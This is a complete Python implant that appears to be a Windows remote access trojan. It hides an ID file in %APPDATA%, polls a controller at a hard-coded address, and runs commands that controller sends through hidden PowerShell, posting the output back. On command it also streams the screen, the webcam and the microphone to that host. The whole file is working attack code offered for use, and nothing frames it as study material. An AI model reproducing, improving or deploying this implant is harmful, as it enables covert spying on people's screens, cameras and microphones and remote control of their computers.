import requests
import time
import uuid
import os
import subprocess
import threading
import mss
import numpy as np
import cv2
import win32api
import win32con
import pyaudio

SERVER_URL = "http://192.168.100.239:8080"  # Change to your controller's URL

# --- Agent State ---
STREAMING_ENABLED = False
STREAM_THREAD = None
AUDIO_STREAMING_ENABLED = False
AUDIO_STREAM_THREAD = None
CAMERA_STREAMING_ENABLED = False
CAMERA_STREAM_THREAD = None

# --- Audio Config ---
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

def get_or_create_agent_id():
    """
    Gets a unique agent ID from %APPDATA%\agent_id.txt or creates it.
    """
    appdata_path = os.getenv('APPDATA')
    id_file_path = os.path.join(appdata_path, 'agent_id.txt')
    
    if os.path.exists(id_file_path):
        with open(id_file_path, 'r') as f:
            return f.read().strip()
    else:
        agent_id = str(uuid.uuid4())
        with open(id_file_path, 'w') as f:
            f.write(agent_id)
        # Hide the file
        win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
        return agent_id

def stream_screen(agent_id):
    """
    Captures the screen and streams it to the controller.
    This function runs in a separate thread.
    """
    global STREAMING_ENABLED
    url = f"{SERVER_URL}/stream/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    with mss.mss() as sct:
        while STREAMING_ENABLED:
            try:
                # Get raw pixels from the screen
                sct_img = sct.grab(sct.monitors[1])
                
                # Create an OpenCV image
                img = np.array(sct_img)
                
                # Encode the image as JPEG with 70% quality
                is_success, buffer = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if not is_success:
                    continue

                # Send the frame to the controller
                requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
                
                # Control frame rate to ~10 FPS
                time.sleep(0.1)
            except Exception as e:
                print(f"Stream error: {e}")
                time.sleep(2) # Wait before retrying

def stream_camera(agent_id):
    """
    Captures the webcam and streams it to the controller.
    This function runs in a separate thread.
    """
    global CAMERA_STREAMING_ENABLED
    url = f"{SERVER_URL}/camera/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    try:
        # Use CAP_DSHOW on Windows for better device compatibility and performance.
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            print("Cannot open webcam")
            CAMERA_STREAMING_ENABLED = False
            return
    except Exception as e:
        print(f"Could not open webcam: {e}")
        CAMERA_STREAMING_ENABLED = False
        return

    while CAMERA_STREAMING_ENABLED:
        try:
            ret, frame = cap.read()
            if not ret:
                break
            is_success, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            if is_success:
                requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
            time.sleep(0.1) # ~10 FPS
        except Exception as e:
            print(f"Camera stream error: {e}")
            break
    cap.release()

def stream_audio(agent_id):
    """
    Captures microphone audio and streams it to the controller.
    This function runs in a separate thread.
    """
    global AUDIO_STREAMING_ENABLED
    url = f"{SERVER_URL}/audio/{agent_id}"
    
    try:
        p = pyaudio.PyAudio()
        # --- Diagnostic: Print the default device to be used ---
        default_device_info = p.get_default_input_device_info()
        print(f"Attempting to use default audio device: {default_device_info['name']}")
        # --- End Diagnostic ---
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, input_device_index=default_device_info['index'])
    except Exception as e:
        print(f"Could not open audio stream: {e}")
        AUDIO_STREAMING_ENABLED = False
        return

    while AUDIO_STREAMING_ENABLED:
        try:
            data = stream.read(CHUNK)
            requests.post(url, data=data, timeout=1)
        except Exception as e:
            print(f"Audio stream error: {e}")
            break
    
    stream.stop_stream()
    stream.close()
    p.terminate()

def start_streaming(agent_id):
    global STREAMING_ENABLED, STREAM_THREAD
    if not STREAMING_ENABLED:
        STREAMING_ENABLED = True
        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
        STREAM_THREAD.daemon = True
        STREAM_THREAD.start()
        print("Started video stream.")

def stop_streaming():
    global STREAMING_ENABLED, STREAM_THREAD
    if STREAMING_ENABLED:
        STREAMING_ENABLED = False
        if STREAM_THREAD:
            STREAM_THREAD.join(timeout=2)
        STREAM_THREAD = None
        print("Stopped video stream.")

def start_audio_streaming(agent_id):
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if not AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = True
        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
        AUDIO_STREAM_THREAD.daemon = True
        AUDIO_STREAM_THREAD.start()
        print("Started audio stream.")

def stop_audio_streaming():
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = False
        if AUDIO_STREAM_THREAD:
            AUDIO_STREAM_THREAD.join(timeout=2)
        AUDIO_STREAM_THREAD = None
        print("Stopped audio stream.")

def start_camera_streaming(agent_id):
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if not CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = True
        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
        CAMERA_STREAM_THREAD.daemon = True
        CAMERA_STREAM_THREAD.start()
        print("Started camera stream.")

def stop_camera_streaming():
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = False
        if CAMERA_STREAM_THREAD:
            CAMERA_STREAM_THREAD.join(timeout=2)
        CAMERA_STREAM_THREAD = None
        print("Stopped camera stream.")

def execute_command(command):
    """Executes a command and returns its output."""
    try:
        # Explicitly use PowerShell to execute commands. This allows PowerShell-specific
        # cmdlets and aliases like 'ls' to work correctly.
        # -NoProfile makes execution faster and more predictable.
        # We pass the command as a list to avoid shell injection vulnerabilities.
        result = subprocess.run(
            ["powershell.exe", "-NoProfile", "-Command", command],
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        output = result.stdout + result.stderr
        if not output:
            return "[No output from command]"
        return output
    except Exception as e:
        return f"Command execution failed: {e}"

def main_loop(agent_id):
    """The main command and control loop."""
    internal_commands = {
        "start-stream": lambda: start_streaming(agent_id),
        "stop-stream": stop_streaming,
        "start-audio": lambda: start_audio_streaming(agent_id),
        "stop-audio": stop_audio_streaming,
        "start-camera": lambda: start_camera_streaming(agent_id),
        "stop-camera": stop_camera_streaming,
    }

    while True:
        try:
            response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
            task = response.json()
            command = task.get("command", "sleep")

            if command in internal_commands:
                internal_commands[command]()
            elif command != "sleep":
                output = execute_command(command)
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
        
        except requests.exceptions.RequestException:
            # This is expected when the server is down, just wait and retry
            pass
        
        # Adaptive sleep to reduce traffic when idle
        sleep_time = 1 if STREAMING_ENABLED or AUDIO_STREAMING_ENABLED or CAMERA_STREAMING_ENABLED else 5
        time.sleep(sleep_time)

if __name__ == "__main__":
    agent_id = get_or_create_agent_id()
    print(f"Agent starting with ID: {agent_id}")
    try:
        main_loop(agent_id)
    except KeyboardInterrupt:
        print("\nAgent shutting down.")
        stop_streaming()
        stop_audio_streaming()
        stop_camera_streaming()